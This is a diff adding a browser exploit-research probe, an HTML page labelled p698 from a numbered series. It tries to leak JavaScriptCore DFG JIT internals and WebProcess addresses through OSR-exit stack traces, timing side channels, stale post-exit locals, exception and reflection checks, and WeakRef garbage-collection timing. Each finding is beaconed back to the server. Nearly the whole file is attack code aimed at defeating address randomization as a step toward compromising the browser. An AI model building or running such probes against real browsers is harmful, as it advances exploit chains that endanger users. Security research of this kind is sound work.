@@ -1,0 +1,340 @@
+<!--
+  p698: DFG OSR exit metadata leak -- address disclosure via JIT internals
+
+  When DFG-compiled code hits an unexpected type or value, it performs an
+  "OSR exit" (On-Stack Replacement) back to the interpreter. The exit
+  mechanism must reconstruct the interpreter frame from the JIT frame,
+  which involves reading JIT-internal metadata (CodeBlock pointers,
+  inline cache states, profiling data).
+
+  If any of this metadata leaks to JS -- through Error.stack, through
+  observable timing, or through values left on the stack after exit --
+  it could reveal the WebProcess text base.
+
+  This probe tests several angles:
+  A) Error objects created during OSR exit (stack trace content)
+  B) DFG profiling counters observable via timing
+  C) Uninitialized values after OSR exit (stale register reads)
+  D) Exception object identity across JIT tiers
+  E) DFG constant pool pointer leak via computed property
+  F) JIT thunk address leak via Function.prototype internals
+
+  CRASH_CLASS: LOW (info leak attempts, no corruption)
+  prior art: p630 (text base survey), p602 (JIT detection), p695-p697
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p698</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P698-START:DFG-OSR-EXIT-LEAK');
+  var results = [];
+
+  // === SECTION A: Error during OSR exit ===
+  // Create an Error object at the exact moment DFG bails out
+  // The stack trace might contain JIT-internal addresses
+  b('A:ERROR-DURING-OSR');
+  try {
+    var errorStack = null;
+    var exitCount = 0;
+
+    function jitTarget(x) {
+      // DFG compiles this expecting x to be an integer
+      var result = x + 1;
+      if (typeof x !== 'number') {
+        // OSR exit happens here when x is not a number
+        errorStack = new Error('osr-exit-' + exitCount).stack;
+        exitCount++;
+      }
+      return result;
+    }
+
+    // Train as integer path
+    for (var i = 0; i < 300000; i++) {
+      jitTarget(i);
+    }
+    b('A:TRAINED-300K');
+
+    // Force OSR exit with string
+    jitTarget('trigger');
+    b('A:EXIT-STACK:' + (errorStack || 'null').substring(0, 200));
+
+    // Force multiple exits and compare stacks
+    var stacks = [];
+    for (var i = 0; i < 5; i++) {
+      jitTarget('trigger' + i);
+      stacks.push(errorStack);
+    }
+
+    // Check if any stack contains hex addresses
+    var hexPattern = /0x[0-9a-f]{6,}/gi;
+    for (var i = 0; i < stacks.length; i++) {
+      var matches = (stacks[i] || '').match(hexPattern);
+      if (matches) {
+        b('A:HEX-IN-STACK:' + matches.join(','));
+        results.push('A:hex=' + matches[0]);
+      }
+    }
+
+    // Check if stacks differ (might contain changing JIT addresses)
+    var allSame = stacks.every(function(s) { return s === stacks[0]; });
+    b('A:STACKS-SAME=' + allSame + ',EXITS=' + exitCount);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: DFG recompilation counter via timing ===
+  // After OSR exit, DFG may recompile with new type info
+  // The recompilation takes time, which could be measurable
+  b('B:RECOMPILE-TIMING');
+  try {
+    function polyTarget(x) {
+      return x.valueOf() + 1;
+    }
+
+    // Measure time for int path after training
+    for (var i = 0; i < 300000; i++) polyTarget(i);
+
+    var t0 = performance.now();
+    for (var i = 0; i < 10000; i++) polyTarget(42);
+    var intTime = performance.now() - t0;
+
+    // Force OSR exit
+    polyTarget({valueOf: function(){ return 99; }});
+
+    // Measure again -- if DFG recompiled, timing may differ
+    var t1 = performance.now();
+    for (var i = 0; i < 10000; i++) polyTarget(42);
+    var recompTime = performance.now() - t1;
+
+    b('B:INT-TIME=' + intTime.toFixed(3) + ',RECOMP-TIME=' + recompTime.toFixed(3));
+    if (Math.abs(recompTime - intTime) > 1) {
+      b('B:TIMING-DELTA:' + (recompTime - intTime).toFixed(3));
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Stale value after OSR exit ===
+  // When DFG exits to interpreter, local variables are reconstructed
+  // from the JIT frame. If reconstruction is incomplete, a stale JIT
+  // register value (which could be a code pointer) might be visible
+  b('C:STALE-LOCALS');
+  try {
+    function staleTest(a, b, c) {
+      var x = a + 1;
+      var y = b + 2;
+      var z = c + 3;
+      // DFG will keep x, y, z in registers
+      if (typeof a === 'string') {
+        // OSR exit -- x, y, z reconstructed from JIT frame
+        // Try to observe any stale value
+        return [x, y, z, arguments[0], arguments[1], arguments[2]];
+      }
+      return x + y + z;
+    }
+
+    // Train
+    for (var i = 0; i < 300000; i++) {
+      staleTest(i, i+1, i+2);
+    }
+    b('C:TRAINED-300K');
+
+    // Trigger OSR exit
+    var r = staleTest('a', 'b', 'c');
+    b('C:RESULT:' + JSON.stringify(r));
+
+    // Check for unexpected types/values
+    for (var i = 0; i < r.length; i++) {
+      if (typeof r[i] !== 'string' && typeof r[i] !== 'number') {
+        b('C:STALE-HIT:idx=' + i + ',type=' + typeof r[i] + ',val=' + r[i]);
+        results.push('C:stale-idx' + i);
+      }
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Exception identity across tiers ===
+  // If an exception object created in JIT code contains different
+  // metadata than one from the interpreter, the delta reveals JIT info
+  b('D:EXCEPTION-IDENTITY');
+  try {
+    var interpError = null;
+    var jitError = null;
+
+    function throwTest(doThrow) {
+      if (doThrow) throw new TypeError('test');
+      return 42;
+    }
+
+    // Get interpreter-tier error
+    try { throwTest(true); } catch(e) { interpError = e; }
+
+    // JIT compile
+    for (var i = 0; i < 300000; i++) throwTest(false);
+
+    // Get JIT-tier error
+    try { throwTest(true); } catch(e) { jitError = e; }
+
+    // Compare all properties
+    var interpProps = Object.getOwnPropertyNames(interpError);
+    var jitProps = Object.getOwnPropertyNames(jitError);
+
+    b('D:INTERP-PROPS:' + interpProps.join(','));
+    b('D:JIT-PROPS:' + jitProps.join(','));
+
+    // Check if stack traces differ structurally
+    var interpStack = (interpError.stack || '').split('\n');
+    var jitStack = (jitError.stack || '').split('\n');
+    b('D:INTERP-DEPTH=' + interpStack.length + ',JIT-DEPTH=' + jitStack.length);
+
+    if (interpStack.length !== jitStack.length) {
+      b('D:DEPTH-MISMATCH');
+      results.push('D:depth-diff');
+    }
+
+    // Check for any hex-like content
+    var jitHex = (jitError.stack || '').match(/0x[0-9a-f]+/gi);
+    if (jitHex) {
+      b('D:JIT-HEX:' + jitHex.join(','));
+      results.push('D:jit-hex');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: DFG constant folding pointer leak ===
+  // DFG folds constants into the compiled code. If a constant is
+  // a pointer (to a JSCell), and we can observe the folded value
+  // through a side channel, we get a heap address
+  b('E:CONSTANT-FOLD-LEAK');
+  try {
+    // Trick: create a function whose DFG compilation embeds a
+    // reference to a specific object, then observe if that
+    // reference is visible through any reflection API
+    var sentinel = {marker: 'SENTINEL_OBJECT'};
+
+    function constFold() {
+      // DFG should embed sentinel as a constant
+      return sentinel;
+    }
+
+    // Train
+    for (var i = 0; i < 300000; i++) constFold();
+    b('E:TRAINED-300K');
+
+    // Check Function.prototype.toString for any address info
+    var src = constFold.toString();
+    b('E:TOSTRING-LEN=' + src.length);
+
+    // Check if the function has any non-standard properties
+    // that DFG might have added
+    var names = Object.getOwnPropertyNames(constFold);
+    var unexpected = names.filter(function(n) {
+      return n !== 'length' && n !== 'name' && n !== 'prototype' &&
+             n !== 'arguments' && n !== 'caller';
+    });
+    if (unexpected.length > 0) {
+      b('E:UNEXPECTED-PROPS:' + unexpected.join(','));
+      results.push('E:props=' + unexpected[0]);
+    }
+
+    // Try to read the function's internal slots via Reflect
+    try {
+      var desc = Object.getOwnPropertyDescriptor(constFold, 'prototype');
+      b('E:PROTO-DESC:' + JSON.stringify(desc).substring(0, 100));
+    } catch(e2) {}
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: new Function() JIT code address ===
+  // new Function() creates a function that gets JIT compiled
+  // If we can detect the address of the JIT code region, we
+  // can derive the text base (JIT code is allocated relative to it)
+  b('F:NEW-FUNCTION-JIT');
+  try {
+    // Create many functions to fill JIT code space
+    var fns = [];
+    for (var i = 0; i < 100; i++) {
+      fns.push(new Function('x', 'return x + ' + i));
+    }
+
+    // Train all of them
+    for (var i = 0; i < 100; i++) {
+      for (var j = 0; j < 50000; j++) {
+        fns[i](j);
+      }
+    }
+    b('F:TRAINED-100-FUNCTIONS');
+
+    // Check if any toString reveals JIT info
+    for (var i = 0; i < 5; i++) {
+      var s = fns[i].toString();
+      if (s.indexOf('0x') >= 0 || s.indexOf('native') >= 0) {
+        b('F:TOSTRING-LEAK:' + s);
+        results.push('F:toString');
+      }
+    }
+
+    // Time-based detection: JIT-compiled functions should be faster
+    // The timing pattern could reveal JIT memory layout
+    var timings = [];
+    for (var i = 0; i < 10; i++) {
+      var t0 = performance.now();
+      for (var j = 0; j < 100000; j++) fns[i](j);
+      timings.push(performance.now() - t0);
+    }
+    b('F:TIMINGS:' + timings.map(function(t){return t.toFixed(2)}).join(','));
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === SECTION G: WeakRef release timing as heap oracle ===
+  // WeakRef + FinalizationRegistry can detect when objects are GC'd
+  // The timing of GC can reveal heap pressure patterns that
+  // correlate with JIT code region allocation
+  b('G:WEAKREF-GC-TIMING');
+  try {
+    var collected = [];
+    var fr = new FinalizationRegistry(function(tag) {
+      collected.push({tag: tag, time: performance.now()});
+    });
+
+    // Create objects and weak refs
+    for (var i = 0; i < 50; i++) {
+      var obj = {idx: i, data: new ArrayBuffer(1024)};
+      fr.register(obj, 'obj-' + i);
+      // Immediately lose strong reference
+    }
+
+    // Force GC by allocating heavily
+    var pressure = [];
+    for (var i = 0; i < 10000; i++) {
+      pressure.push(new ArrayBuffer(4096));
+      if (i % 1000 === 0) pressure = [];
+    }
+
+    // Check what was collected
+    b('G:COLLECTED=' + collected.length);
+    if (collected.length > 0) {
+      var times = collected.map(function(c){return c.tag + '@' + c.time.toFixed(1)});
+      b('G:TIMING:' + times.slice(0, 5).join(','));
+    }
+  } catch(e) {
+    b('G:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P698-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P698-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P698-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p698: DFG OSR exit metadata leak + JIT internals probes</pre></body></html>
